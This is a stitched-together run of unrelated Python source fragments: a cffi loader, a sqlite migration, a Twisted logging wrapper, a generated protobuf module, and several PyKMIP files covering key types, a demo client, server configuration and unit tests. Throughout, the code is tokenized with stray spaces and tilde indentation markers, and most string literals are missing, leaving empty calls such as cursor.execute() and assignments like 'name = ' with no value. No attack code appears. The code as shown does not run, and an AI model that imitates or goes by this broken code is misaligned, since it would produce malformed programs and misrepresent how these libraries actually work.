self . _lib = None \n 
\n 
# This prevents the compile_module() from being called, the module \n 
# should have been compiled by setup.py \n 
def _compile_module ( * args , ** kwargs ) : \n 
~~~ raise RuntimeError ( "Cannot compile module during runtime" ) \n 
~~ self . ffi . verifier . compile_module = _compile_module \n 
\n 
~~ def __getattr__ ( self , name ) : \n 
~~~ if self . _lib is None : \n 
~~~ self . _lib = self . ffi . verifier . load_library ( ) \n 
\n 
# redirect attribute access to the underlying lib \n 
~~ return getattr ( self . _lib , name ) \n 
\n 
~~ ~~ lib = Library ( ffi ) \n 
import sqlite3 \n 
\n 
\n 
def migrate ( database_path ) : \n 
~~~ print "migrating to db version 1" \n 
conn = sqlite3 . connect ( database_path ) \n 
conn . text_factory = str \n 
cursor = conn . cursor ( ) \n 
\n 
# read notifications from db \n 
cursor . execute ( ) \n 
notifications = cursor . fetchall ( ) \n 
\n 
# delete notifications table \n 
cursor . execute ( ) \n 
\n 
# create new table \n 
cursor . execute ( ) \n 
cursor . execute ( ) \n 
\n 
# write notifications back into db \n 
for n in notifications : \n 
~~~ cursor . execute ( , ( n [ 0 ] , n [ 1 ] , n [ 2 ] , n [ 3 ] , n [ 4 ] , n [ 5 ] , n [ 6 ] , n [ 7 ] , \n 
# update version \n 
~~ cursor . execute ( ) \n 
conn . commit ( ) \n 
conn . close ( ) \n 
~~ """\nCopyright (c) 2014 Brian Muller\n""" \n 
\n 
import sys \n 
from twisted . python import log \n 
\n 
DEBUG = 5 \n 
WARNING = 4 \n 
INFO = 3 \n 
ERROR = 2 \n 
CRITICAL = 1 \n 
\n 
levels = { "debug" : 5 , "warning" : 4 , "info" : 3 , "error" : 2 , "critical" : 1 } \n 
\n 
class FileLogObserver ( log . FileLogObserver ) : \n 
~~~ def __init__ ( self , f = None , level = "info" , default = DEBUG ) : \n 
~~~ log . FileLogObserver . __init__ ( self , f or sys . stdout ) \n 
self . level = levels [ level ] \n 
self . default = default \n 
\n 
~~ def emit ( self , eventDict ) : \n 
~~~ ll = eventDict . get ( , self . default ) \n 
if eventDict [ ] or in eventDict or self . level >= ll : \n 
~~~ log . FileLogObserver . emit ( self , eventDict ) \n 
\n 
\n 
~~ ~~ ~~ class Logger ( object ) : \n 
~~~ def __init__ ( self , ** kwargs ) : \n 
~~~ self . kwargs = kwargs \n 
\n 
~~ def msg ( self , message , ** kw ) : \n 
~~~ kw . update ( self . kwargs ) \n 
if in kw and not isinstance ( kw [ ] , str ) : \n 
~~~ kw [ ] = kw [ ] . __class__ . __name__ \n 
~~ log . msg ( message , ** kw ) \n 
\n 
~~ def info ( self , message , ** kw ) : \n 
~~~ kw [ ] = INFO \n 
self . msg ( "[INFO] %s" % message , ** kw ) \n 
\n 
~~ def debug ( self , message , ** kw ) : \n 
~~~ kw [ ] = DEBUG \n 
self . msg ( "[DEBUG] %s" % message , ** kw ) \n 
\n 
~~ def warning ( self , message , ** kw ) : \n 
~~~ kw [ ] = WARNING \n 
self . msg ( "[WARNING] %s" % message , ** kw ) \n 
\n 
~~ def error ( self , message , ** kw ) : \n 
~~~ kw [ ] = ERROR \n 
self . msg ( "[ERROR] %s" % message , ** kw ) \n 
\n 
~~ def critical ( self , message , ** kw ) : \n 
~~~ kw [ ] = CRITICAL \n 
self . msg ( "[CRITICAL] %s" % message , ** kw ) \n 
\n 
\n 
~~ ~~ try : \n 
~~~ theLogger \n 
~~ except NameError : \n 
~~~ theLogger = Logger ( ) \n 
msg = theLogger . msg \n 
info = theLogger . info \n 
debug = theLogger . debug \n 
warning = theLogger . warning \n 
error = theLogger . error \n 
critical = theLogger . critical \n 
# Generated by the protocol buffer compiler.  DO NOT EDIT! \n 
# source: peers.proto \n 
\n 
#pylint: skip-file \n 
\n 
~~ import sys \n 
_b = sys . version_info [ 0 ] < 3 and ( lambda x : x ) or ( lambda x : x . encode ( ) ) \n 
from google . protobuf import descriptor as _descriptor \n 
from google . protobuf import message as _message \n 
from google . protobuf import reflection as _reflection \n 
from google . protobuf import symbol_database as _symbol_database \n 
from google . protobuf import descriptor_pb2 \n 
# @@protoc_insertion_point(imports) \n 
\n 
_sym_db = _symbol_database . Default ( ) \n 
\n 
\n 
\n 
\n 
DESCRIPTOR = _descriptor . FileDescriptor ( \n 
name = , \n 
package = , \n 
serialized_pb = _b ( \'\\n\\x0bpeers.proto\\"6\\n\\tPeerSeeds\\x12\\x16\\n\\x0eserializedNode\\x18\\x01 \\x03(\\x0c\\x12\\x11\\n\\tsignature\\x18\\x02 \\x02(\\x0c\' ) \n 
_sym_db . RegisterFileDescriptor ( DESCRIPTOR ) \n 
\n 
\n 
\n 
\n 
_PEERSEEDS = _descriptor . Descriptor ( \n 
name = , \n 
full_name = , \n 
filename = None , \n 
file = DESCRIPTOR , \n 
containing_type = None , \n 
fields = [ \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 0 , \n 
number = 1 , type = 12 , cpp_type = 9 , label = 3 , \n 
has_default_value = False , default_value = [ ] , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 1 , \n 
number = 2 , type = 12 , cpp_type = 9 , label = 2 , \n 
has_default_value = False , default_value = _b ( "" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
] , \n 
extensions = [ \n 
] , \n 
nested_types = [ ] , \n 
enum_types = [ \n 
] , \n 
options = None , \n 
is_extendable = False , \n 
extension_ranges = [ ] , \n 
oneofs = [ \n 
] , \n 
serialized_start = 15 , \n 
serialized_end = 69 , \n 
) \n 
\n 
DESCRIPTOR . message_types_by_name [ ] = _PEERSEEDS \n 
\n 
PeerSeeds = _reflection . GeneratedProtocolMessageType ( , ( _message . Message , ) , dict ( \n 
DESCRIPTOR = _PEERSEEDS , \n 
__module__ = \n 
# @@protoc_insertion_point(class_scope:PeerSeeds) \n 
) ) \n 
_sym_db . RegisterMessage ( PeerSeeds ) \n 
\n 
\n 
# @@protoc_insertion_point(module_scope) \n 
# Copyright (c) 2014 The Johns Hopkins University/Applied Physics Laboratory \n 
# All Rights Reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
# not use this file except in compliance with the License. You may obtain \n 
# a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
# License for the specific language governing permissions and limitations \n 
# under the License. \n 
\n 
# This module defines classes representing all of the different key types \n 
# used by KMIP, including the more detailed structures of the Transparent \n 
# Keys defined in Section 2.1.7. \n 
\n 
from kmip . core . enums import Tags \n 
\n 
from kmip . core . primitives import Struct \n 
from kmip . core . primitives import ByteString \n 
\n 
from kmip . core . utils import BytearrayStream \n 
\n 
\n 
class RawKey ( ByteString ) : \n 
\n 
~~~ def __init__ ( self , value = None ) : \n 
~~~ super ( RawKey , self ) . __init__ ( value , Tags . KEY_MATERIAL ) \n 
\n 
\n 
~~ ~~ class OpaqueKey ( ByteString ) : \n 
\n 
~~~ def __init__ ( self , value = None ) : \n 
~~~ super ( OpaqueKey , self ) . __init__ ( value , Tags . KEY_MATERIAL ) \n 
\n 
\n 
~~ ~~ class PKCS1Key ( ByteString ) : \n 
\n 
~~~ def __init__ ( self , value = None ) : \n 
~~~ super ( PKCS1Key , self ) . __init__ ( value , Tags . KEY_MATERIAL ) \n 
\n 
\n 
~~ ~~ class PKCS8Key ( ByteString ) : \n 
\n 
~~~ def __init__ ( self , value = None ) : \n 
~~~ super ( PKCS8Key , self ) . __init__ ( value , Tags . KEY_MATERIAL ) \n 
\n 
\n 
~~ ~~ class X509Key ( ByteString ) : \n 
\n 
~~~ def __init__ ( self , value = None ) : \n 
~~~ super ( X509Key , self ) . __init__ ( value , Tags . KEY_MATERIAL ) \n 
\n 
\n 
~~ ~~ class ECPrivateKey ( ByteString ) : \n 
\n 
~~~ def __init__ ( self , value = None ) : \n 
~~~ super ( ECPrivateKey , self ) . __init__ ( value , Tags . KEY_MATERIAL ) \n 
\n 
\n 
# 2.1.7.1 \n 
~~ ~~ class TransparentSymmetricKey ( Struct ) : \n 
\n 
~~~ class Key ( ByteString ) : \n 
\n 
~~~ def __init__ ( self , value = None ) : \n 
~~~ super ( TransparentSymmetricKey . Key , self ) . __init__ ( value , Tags . KEY ) \n 
\n 
~~ ~~ def __init__ ( self , key = None ) : \n 
~~~ super ( TransparentSymmetricKey , self ) . __init__ ( Tags . KEY_MATERIAL ) \n 
self . key = key \n 
self . validate ( ) \n 
\n 
~~ def read ( self , istream ) : \n 
~~~ super ( TransparentSymmetricKey , self ) . read ( istream ) \n 
tstream = BytearrayStream ( istream . read ( self . length ) ) \n 
\n 
self . key = TransparentSymmetricKey . Key ( ) \n 
self . key . read ( tstream ) \n 
\n 
self . is_oversized ( tstream ) \n 
self . validate ( ) \n 
\n 
~~ def write ( self , ostream ) : \n 
~~~ tstream = BytearrayStream ( ) \n 
\n 
self . key . write ( tstream ) \n 
\n 
# Write the length and value of the key wrapping data \n 
self . length = tstream . length ( ) \n 
super ( TransparentSymmetricKey , self ) . write ( ostream ) \n 
ostream . write ( tstream . buffer ) \n 
\n 
~~ def validate ( self ) : \n 
~~~ self . __validate ( ) \n 
\n 
~~ def __validate ( self ) : \n 
# TODO (peter-hamilton) Finish implementation. \n 
~~~ pass \n 
# Copyright (c) 2015 The Johns Hopkins University/Applied Physics Laboratory \n 
# All Rights Reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
# not use this file except in compliance with the License. You may obtain \n 
# a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
# License for the specific language governing permissions and limitations \n 
# under the License. \n 
\n 
~~ ~~ import logging \n 
import sys \n 
\n 
from kmip . core import enums \n 
from kmip . demos import utils \n 
\n 
from kmip . pie import client \n 
from kmip . pie import objects \n 
\n 
\n 
if __name__ == : \n 
~~~ logger = utils . build_console_logger ( logging . INFO ) \n 
\n 
parser = utils . build_cli_parser ( ) \n 
opts , args = parser . parse_args ( sys . argv [ 1 : ] ) \n 
\n 
config = opts . config \n 
\n 
value = \n 
opaque_type = enums . OpaqueDataType . NONE \n 
name = \n 
\n 
obj = objects . OpaqueObject ( value , opaque_type , name ) \n 
\n 
# Build the client and connect to the server \n 
with client . ProxyKmipClient ( config = config ) as client : \n 
~~~ try : \n 
~~~ uid = client . register ( obj ) \n 
logger . info ( "Successfully registered opaque object with ID: " \n 
"{0}" . format ( uid ) ) \n 
~~ except Exception as e : \n 
~~~ logger . error ( e ) \n 
# Copyright (c) 2016 The Johns Hopkins University/Applied Physics Laboratory \n 
# All Rights Reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
# not use this file except in compliance with the License. You may obtain \n 
# a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
# License for the specific language governing permissions and limitations \n 
# under the License. \n 
\n 
~~ ~~ ~~ import logging \n 
import os \n 
import six \n 
\n 
from six . moves import configparser \n 
\n 
from kmip . core import exceptions \n 
\n 
\n 
class KmipServerConfig ( object ) : \n 
~~~ """\n    A configuration management tool for the KmipServer.\n    """ \n 
\n 
def __init__ ( self ) : \n 
~~~ """\n        Create a KmipServerConfig object.\n        """ \n 
self . _logger = logging . getLogger ( ) \n 
\n 
self . settings = dict ( ) \n 
\n 
self . _expected_settings = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
~~ def set_setting ( self , setting , value ) : \n 
~~~ """\n        Set a specific setting value.\n\n        This will overwrite the current setting value for the specified\n        setting.\n\n        Args:\n            setting (string): The name of the setting to set (e.g.,\n                \'certificate_path\', \'hostname\'). Required.\n            value (misc): The value of the setting to set. Type varies based\n                on setting. Required.\n        Raises:\n            ConfigurationError: Raised if the setting is not supported or if\n                the setting value is invalid.\n        """ \n 
if setting not in self . _expected_settings : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"Setting \'{0}\' is not supported." . format ( setting ) \n 
) \n 
\n 
~~ if setting == : \n 
~~~ self . _set_hostname ( value ) \n 
~~ elif setting == : \n 
~~~ self . _set_port ( value ) \n 
~~ elif setting == : \n 
~~~ self . _set_certificate_path ( value ) \n 
~~ elif setting == : \n 
~~~ self . _set_key_path ( value ) \n 
~~ elif setting == : \n 
~~~ self . _set_ca_path ( value ) \n 
~~ else : \n 
~~~ self . _set_auth_suite ( value ) \n 
\n 
~~ ~~ def load_settings ( self , path ) : \n 
~~~ """\n        Load configuration settings from the file pointed to by path.\n\n        This will overwrite all current setting values.\n\n        Args:\n            path (string): The path to the configuration file containing\n                the settings to load. Required.\n        Raises:\n            ConfigurationError: Raised if the path does not point to an\n                existing file or if a setting value is invalid.\n        """ \n 
if not os . path . exists ( path ) : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The server configuration file (\'{0}\') could not be " \n 
"located." . format ( path ) \n 
) \n 
\n 
~~ self . _logger . info ( \n 
"Loading server configuration settings from: {0}" . format ( path ) \n 
) \n 
\n 
parser = configparser . SafeConfigParser ( ) \n 
parser . read ( path ) \n 
self . _parse_settings ( parser ) \n 
\n 
~~ def _parse_settings ( self , parser ) : \n 
~~~ if not parser . has_section ( ) : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The server configuration file does not have a \'server\' " \n 
"section." \n 
) \n 
\n 
~~ settings = [ x [ 0 ] for x in parser . items ( ) ] \n 
for setting in settings : \n 
~~~ if setting not in self . _expected_settings : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"Setting \'{0}\' is not a supported setting. Please " \n 
"remove it from the configuration file." . format ( setting ) \n 
) \n 
~~ ~~ for setting in self . _expected_settings : \n 
~~~ if setting not in settings : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"Setting \'{0}\' is missing from the configuration " \n 
"file." . format ( setting ) \n 
) \n 
\n 
~~ ~~ if parser . has_option ( , ) : \n 
~~~ self . _set_hostname ( parser . get ( , ) ) \n 
~~ if parser . has_option ( , ) : \n 
~~~ self . _set_port ( parser . getint ( , ) ) \n 
~~ if parser . has_option ( , ) : \n 
~~~ self . _set_certificate_path ( parser . get ( \n 
, \n 
) \n 
) \n 
~~ if parser . has_option ( , ) : \n 
~~~ self . _set_key_path ( parser . get ( , ) ) \n 
~~ if parser . has_option ( , ) : \n 
~~~ self . _set_ca_path ( parser . get ( , ) ) \n 
~~ if parser . has_option ( , ) : \n 
~~~ self . _set_auth_suite ( parser . get ( , ) ) \n 
\n 
~~ ~~ def _set_hostname ( self , value ) : \n 
~~~ if isinstance ( value , six . string_types ) : \n 
~~~ self . settings [ ] = value \n 
~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The hostname value must be a string." \n 
) \n 
\n 
~~ ~~ def _set_port ( self , value ) : \n 
~~~ if isinstance ( value , six . integer_types ) : \n 
~~~ if 0 < value < 65535 : \n 
~~~ self . settings [ ] = value \n 
~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The port value must be an integer in the range 0 - 65535." \n 
) \n 
~~ ~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The port value must be an integer in the range 0 - 65535." \n 
) \n 
\n 
~~ ~~ def _set_certificate_path ( self , value ) : \n 
~~~ if value is None : \n 
~~~ self . settings [ ] = None \n 
~~ elif isinstance ( value , six . string_types ) : \n 
~~~ if os . path . exists ( value ) : \n 
~~~ self . settings [ ] = value \n 
~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The certificate path value, if specified, must be a " \n 
"valid string path to a certificate file." \n 
) \n 
~~ ~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The certificate path value, if specified, must be a valid " \n 
"string path to a certificate file." \n 
) \n 
\n 
~~ ~~ def _set_key_path ( self , value ) : \n 
~~~ if value is None : \n 
~~~ self . settings [ ] = None \n 
~~ elif isinstance ( value , six . string_types ) : \n 
~~~ if os . path . exists ( value ) : \n 
~~~ self . settings [ ] = value \n 
~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The key path value, if specified, must be a valid string " \n 
"path to a certificate key file." \n 
) \n 
~~ ~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The key path value, if specified, must be a valid string " \n 
"path to a certificate key file." \n 
) \n 
\n 
~~ ~~ def _set_ca_path ( self , value ) : \n 
~~~ if value is None : \n 
~~~ self . settings [ ] = None \n 
~~ elif isinstance ( value , six . string_types ) : \n 
~~~ if os . path . exists ( value ) : \n 
~~~ self . settings [ ] = value \n 
~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The certificate authority (CA) path value, if " \n 
"specified, must be a valid string path to a CA " \n 
"certificate file." \n 
) \n 
~~ ~~ else : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The certificate authority (CA) path value, if specified, " \n 
"must be a valid string path to a CA certificate file." \n 
) \n 
\n 
~~ ~~ def _set_auth_suite ( self , value ) : \n 
~~~ auth_suites = [ , ] \n 
if value not in auth_suites : \n 
~~~ raise exceptions . ConfigurationError ( \n 
"The authentication suite must be one of the " \n 
"following: Basic, TLS1.2" \n 
) \n 
~~ else : \n 
~~~ self . settings [ ] = value \n 
# Copyright (c) 2014 The Johns Hopkins University/Applied Physics Laboratory \n 
# All Rights Reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
# not use this file except in compliance with the License. You may obtain \n 
# a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
# License for the specific language governing permissions and limitations \n 
# under the License. \n 
\n 
~~ ~~ ~~ from six . moves import xrange \n 
\n 
from testtools import TestCase \n 
\n 
from kmip . core import utils \n 
\n 
from kmip . core . messages . contents import ProtocolVersion \n 
from kmip . core . messages . payloads import discover_versions \n 
\n 
\n 
class TestDiscoverVersionsRequestPayload ( TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ super ( TestDiscoverVersionsRequestPayload , self ) . setUp ( ) \n 
\n 
self . protocol_versions_empty = list ( ) \n 
self . protocol_versions_one = list ( ) \n 
self . protocol_versions_one . append ( ProtocolVersion . create ( 1 , 0 ) ) \n 
self . protocol_versions_two = list ( ) \n 
self . protocol_versions_two . append ( ProtocolVersion . create ( 1 , 1 ) ) \n 
self . protocol_versions_two . append ( ProtocolVersion . create ( 1 , 0 ) ) \n 
\n 
self . encoding_empty = utils . BytearrayStream ( ( \n 
) ) \n 
self . encoding_one = utils . BytearrayStream ( ( \n 
\n 
\n 
\n 
) ) \n 
self . encoding_two = utils . BytearrayStream ( ( \n 
\n 
\n 
\n 
\n 
\n 
) ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ super ( TestDiscoverVersionsRequestPayload , self ) . tearDown ( ) \n 
\n 
~~ def test_init_with_none ( self ) : \n 
~~~ discover_versions . DiscoverVersionsRequestPayload ( ) \n 
\n 
~~ def test_init_with_args ( self ) : \n 
~~~ discover_versions . DiscoverVersionsRequestPayload ( \n 
self . protocol_versions_empty ) \n 
\n 
~~ def test_validate_with_invalid_protocol_versions ( self ) : \n 
~~~ kwargs = { : } \n 
self . assertRaisesRegexp ( \n 
TypeError , "invalid protocol versions list" , \n 
discover_versions . DiscoverVersionsRequestPayload , ** kwargs ) \n 
\n 
~~ def test_validate_with_invalid_protocol_version ( self ) : \n 
~~~ kwargs = { : [ ] } \n 
self . assertRaisesRegexp ( \n 
TypeError , "invalid protocol version" , \n 
discover_versions . DiscoverVersionsRequestPayload , ** kwargs ) \n 
\n 
~~ def _test_read ( self , stream , payload , protocol_versions ) : \n 
~~~ payload . read ( stream ) \n 
expected = len ( protocol_versions ) \n 
observed = len ( payload . protocol_versions ) \n 
\n 
msg = "protocol versions list decoding mismatch" \n 
msg += "; expected {0} results, received {1}" . format ( \n 
expected , observed ) \n 
self . assertEqual ( expected , observed , msg ) \n 
\n 
for i in xrange ( len ( protocol_versions ) ) : \n 
~~~ expected = protocol_versions [ i ] \n 
observed = payload . protocol_versions [ i ] \n 
\n 
msg = "protocol version decoding mismatch" \n 
msg += "; expected {0}, received {1}" . format ( expected , observed ) \n 
self . assertEqual ( expected , observed , msg ) \n 
\n 
~~ ~~ def test_read_with_empty_protocol_list ( self ) : \n 
~~~ stream = self . encoding_empty \n 
payload = discover_versions . DiscoverVersionsRequestPayload ( ) \n 
protocol_versions = self . protocol_versions_empty \n 
\n 
self . _test_read ( stream , payload , protocol_versions ) \n 
\n 
~~ def test_read_with_one_protocol_version ( self ) : \n 
~~~ stream = self . encoding_one \n 
payload = discover_versions . DiscoverVersionsRequestPayload ( ) \n 
protocol_versions = self . protocol_versions_one \n 
\n 
self . _test_read ( stream , payload , protocol_versions ) \n 
\n 
~~ def test_read_with_two_protocol_versions ( self ) : \n 
~~~ stream = self . encoding_two \n 
payload = discover_versions . DiscoverVersionsRequestPayload ( ) \n 
protocol_versions = self . protocol_versions_two \n 
\n 
self . _test_read ( stream , payload , protocol_versions ) \n 
\n 
~~ def _test_write ( self , payload , expected ) : \n 
~~~ stream = utils . BytearrayStream ( ) \n 
payload . write ( stream ) \n 
\n 
length_expected = len ( expected ) \n 
length_received = len ( stream ) \n 
\n 
msg = "encoding lengths not equal" \n 
msg += "; expected {0}, received {1}" . format ( \n 
length_expected , length_received ) \n 
self . assertEqual ( length_expected , length_received , msg ) \n 
\n 
msg = "encoding mismatch" \n 
msg += ";\\nexpected:\\n{0}\\nreceived:\\n{1}" . format ( expected , stream ) \n 
\n 
self . assertEqual ( expected , stream , msg ) \n 
\n 
~~ def test_write_with_empty_protocol_list ( self ) : \n 
~~~ payload = discover_versions . DiscoverVersionsRequestPayload ( \n 
self . protocol_versions_empty ) \n 
expected = self . encoding_empty \n 
\n 
self . _test_write ( payload , expected ) \n 
\n 
~~ def test_write_with_one_protocol_version ( self ) : \n 
~~~ payload = discover_versions . DiscoverVersionsRequestPayload ( \n 
self . protocol_versions_one ) \n 
expected = self . encoding_one \n 
\n 
self . _test_write ( payload , expected ) \n 
\n 
~~ def test_write_with_two_protocol_versions ( self ) : \n 
~~~ payload = discover_versions . DiscoverVersionsRequestPayload ( \n 
self . protocol_versions_two ) \n 
expected = self . encoding_two \n 
\n 
self . _test_write ( payload , expected ) \n 
\n 
\n 
~~ ~~ class TestDiscoverVersionsResponsePayload ( TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ super ( TestDiscoverVersionsResponsePayload , self ) . setUp ( ) \n 
\n 
self . protocol_versions_empty = list ( ) \n 
self . protocol_versions_one = list ( ) \n 
self . protocol_versions_one . append ( ProtocolVersion . create ( 1 , 0 ) ) \n 
self . protocol_versions_two = list ( ) \n 
self . protocol_versions_two . append ( ProtocolVersion . create ( 1 , 1 ) ) \n 
self . protocol_versions_two . append ( ProtocolVersion . create ( 1 , 0 ) ) \n 
\n 
self . encoding_empty = utils . BytearrayStream ( ( \n 
) ) \n 
self . encoding_one = utils . BytearrayStream ( ( \n 
\n 
\n 
\n 
) ) \n 
self . encoding_two = utils . BytearrayStream ( ( \n 
\n 
\n 
\n 
\n 
\n 
) ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ super ( TestDiscoverVersionsResponsePayload , self ) . tearDown ( ) \n 
\n 
~~ def test_init_with_none ( self ) : \n 
~~~ discover_versions . DiscoverVersionsResponsePayload ( ) \n 
\n 
~~ def test_init_with_args ( self ) : \n 
~~~ discover_versions . DiscoverVersionsResponsePayload ( \n 
self . protocol_versions_empty ) \n 
\n 
~~ def test_validate_with_invalid_protocol_versions ( self ) : \n 
~~~ kwargs = { : } \n 
self . assertRaisesRegexp ( \n 
TypeError , "invalid protocol versions list" , \n 
discover_versions . DiscoverVersionsResponsePayload , ** kwargs ) \n 
\n 
~~ def test_validate_with_invalid_protocol_version ( self ) : \n 
~~~ kwargs = { : [ ] } \n 
self . assertRaisesRegexp ( \n 
TypeError , "invalid protocol version" , \n 
discover_versions . DiscoverVersionsResponsePayload , ** kwargs ) \n 
\n 
~~ def _test_read ( self , stream , payload , protocol_versions ) : \n 
~~~ payload . read ( stream ) \n 
expected = len ( protocol_versions ) \n 
observed = len ( payload . protocol_versions ) \n 
\n 
msg = "protocol versions list decoding mismatch" \n 
msg += "; expected {0} results, received {1}" . format ( \n 
expected , observed ) \n 
self . assertEqual ( expected , observed , msg ) \n 
\n 
for i in xrange ( len ( protocol_versions ) ) : \n 
~~~ expected = protocol_versions [ i ] \n 
observed = payload . protocol_versions [ i ] \n 
\n 
msg = "protocol version decoding mismatch" \n 
msg += "; expected {0}, received {1}" . format ( expected , observed ) \n 
self . assertEqual ( expected , observed , msg ) \n 
\n 
~~ ~~ def test_read_with_empty_protocol_list ( self ) : \n 
~~~ stream = self . encoding_empty \n 
payload = discover_versions . DiscoverVersionsResponsePayload ( ) \n 
protocol_versions = self . protocol_versions_empty \n 
\n 
self . _test_read ( stream , payload , protocol_versions ) \n 
\n 
~~ def test_read_with_one_protocol_version ( self ) : \n 
~~~ stream = self . encoding_one \n 
payload = discover_versions . DiscoverVersionsResponsePayload ( ) \n 
protocol_versions = self . protocol_versions_one \n 
\n 
self . _test_read ( stream , payload , protocol_versions ) \n 
\n 
~~ def test_read_with_two_protocol_versions ( self ) : \n 
~~~ stream = self . encoding_two \n 
payload = discover_versions . DiscoverVersionsResponsePayload ( ) \n 
protocol_versions = self . protocol_versions_two \n 
\n 
self . _test_read ( stream , payload , protocol_versions ) \n 
\n 
~~ def _test_write ( self , payload , expected ) : \n 
~~~ stream = utils . BytearrayStream ( ) \n 
payload . write ( stream ) \n 
\n 
length_expected = len ( expected ) \n 
length_received = len ( stream ) \n 
\n 
msg = "encoding lengths not equal" \n 
msg += "; expected {0}, received {1}" . format ( \n 
length_expected , length_received ) \n 
self . assertEqual ( length_expected , length_received , msg ) \n 
\n 
msg = "encoding mismatch" \n 
msg += ";\\nexpected:\\n{0}\\nreceived:\\n{1}" . format ( expected , stream ) \n 
\n 
self . assertEqual ( expected , stream , msg ) \n 
\n 
~~ def test_write_with_empty_protocol_list ( self ) : \n 
~~~ payload = discover_versions . DiscoverVersionsResponsePayload ( \n 
self . protocol_versions_empty ) \n 
expected = self . encoding_empty \n 
\n 
self . _test_write ( payload , expected ) \n 
\n 
~~ def test_write_with_one_protocol_version ( self ) : \n 
~~~ payload = discover_versions . DiscoverVersionsResponsePayload ( \n 
self . protocol_versions_one ) \n 
expected = self . encoding_one \n 
\n 
self . _test_write ( payload , expected ) \n 
\n 
~~ def test_write_with_two_protocol_versions ( self ) : \n 
~~~ payload = discover_versions . DiscoverVersionsResponsePayload ( \n 
self . protocol_versions_two ) \n 
expected = self . encoding_two \n 
\n 
self . _test_write ( payload , expected ) \n 
# Copyright (c) 2015 The Johns Hopkins University/Applied Physics Laboratory \n 
# All Rights Reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
# not use this file except in compliance with the License. You may obtain \n 
# a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
# License for the specific language governing permissions and limitations \n 
# under the License. \n 
\n 
~~ ~~ import binascii \n 
import testtools \n 
\n 
from kmip . core import enums \n 
from kmip . pie . objects import ManagedObject , OpaqueObject \n 
from kmip . pie import sqltypes \n 
from sqlalchemy import create_engine \n 
from sqlalchemy . orm import sessionmaker \n 
\n 
\n 
class TestOpaqueObject ( testtools . TestCase ) : \n 
~~~ """\n    Test suite for OpaqueObject.\n    """ \n 
def setUp ( self ) : \n 
~~~ super ( TestOpaqueObject , self ) . setUp ( ) \n 
\n 
# Encoding taken from Sections 3.1.5 of the KMIP 1.1 testing \n 
# documentation. \n 
self . bytes_a = ( \n 
) \n 
self . bytes_b = ( \n 
) \n 
self . engine = create_engine ( , echo = True ) \n 
sqltypes . Base . metadata . create_all ( self . engine ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ super ( TestOpaqueObject , self ) . tearDown ( ) \n 
\n 
~~ def test_init ( self ) : \n 
~~~ """\n        Test that a OpaqueObject object can be instantiated.\n        """ \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE ) \n 
\n 
self . assertEqual ( obj . value , self . bytes_a ) \n 
self . assertEqual ( obj . opaque_type , enums . OpaqueDataType . NONE ) \n 
self . assertEqual ( obj . names , [ ] ) \n 
\n 
~~ def test_init_with_args ( self ) : \n 
~~~ """\n        Test that a OpaqueObject object can be instantiated with all arguments.\n        """ \n 
obj = OpaqueObject ( \n 
self . bytes_a , \n 
enums . OpaqueDataType . NONE , \n 
name = ) \n 
\n 
self . assertEqual ( obj . value , self . bytes_a ) \n 
self . assertEqual ( obj . opaque_type , enums . OpaqueDataType . NONE ) \n 
self . assertEqual ( obj . names , [ ] ) \n 
\n 
